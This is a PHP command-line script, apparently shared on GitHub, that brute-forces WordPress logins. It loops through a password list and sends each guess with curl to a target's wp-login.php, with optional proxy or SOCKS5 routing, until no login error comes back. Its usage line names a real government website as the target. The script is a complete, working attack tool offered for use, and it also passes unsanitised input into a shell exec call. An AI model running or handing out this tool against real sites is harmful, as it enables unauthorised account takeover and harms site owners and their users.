#!/usr/bin/env php
<?php
	/*
	** WordPress Brute Force Login
	** version 0.1 by theMiddle
	** GitHub: https://github.com/theMiddleBlue
	**
	** Usage:
	** # chmod +x wpbf.php
	** # ./wpbf.php -t https://www.nsa.gov -u admin -p password.txt -P my.proxy.ch:3218
	*/

	$UA = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
	$args = implode('|', $argv);

	echo("\n+ WordPress Brute Force Login (by theMiddle)\n+ ".str_repeat('-', 42)."\n");
	if(preg_match('/\-t\|(http|https)\:\/\/([^\|\/]+)/i', $args, $arr)) {
		if(preg_match('/(.+)\/(wp\-login|wp\-admin)/', $arr[2], $na)) {
			$target = $arr[1].'://'.$na[1];
		} else {
			$target = $arr[1].'://'.$arr[2];
		}

		echo("+ set target to ".$target."\n");
	}

	if(preg_match('/\-u\|(\S+)/i', $args, $arr)) {
		$user = $arr[1];
		echo("+ set user to ".$user."\n");
	}

	if(preg_match('/\-p\|(\S+)/i', $args, $arr)) {
		$pfile = $arr[1];
		echo("+ set password file to ".$pfile."\n");
	}

	$proxy='';
	if(preg_match('/\-P\|([^\:]+)\:(\d+)/i', $args, $arr)) {
		$proxy = ' -x '.$arr[1].':'.$arr[2];
		echo("+ set proxy to ".$pfile."\n");
	}

	$socks='';
	if(preg_match('/\-S\|([^\:]+)\:(\d+)/i', $args, $arr)) {
		$socks = ' --socks5 '.$arr[1].':'.$arr[2];
		echo("+ set socks5 to ".$pfile."\n");
	}

	if(!isset($argv[1]) || preg_match('/\|\-h/', $args)) {
		die("+\n+ Usage: ".$argv[0]." -t <Target URL> -u <username> [-p <password file>] [-P <proxy-host:proxy-port] [-S <socks-host:socks-port>]\n+\n\n");
	}

	if(isset($pfile)) {
		$f = file($pfile);
	} else {
		$f = file('password.txt');
	}

	$tot = count($f);
	foreach($f as $k => $v) {
		unset($a);
		echo("[".$k."/".$tot."] Trying ".$user."/".trim($v));
		exec('curl -s -b '.__DIR__.'/cookie.txt -c '.__DIR__.'/cookie.txt'.$proxy.$socks.' -A "'.$UA.'" -d "log='.$user.'&pwd='.urlencode(trim($v)).'&wp-submit=wp-submit&redirect_to='.urlencode($target."/wp-admin/").'&testcookie=1" "'.$target.'/wp-login.php" | grep "login\_error" | wc -l', $a);
		if($a[0] <= 0) {
			echo("\n+\n+ Found user / password for ".$target.": ".$user." / \033[41m".trim($v)."\033[0m\n+\n\n");
			exit(0);
		} else {
			echo("\033[99D");
			echo("\033[K");
		}
	}

	echo("+ Password not found.\n");
?>
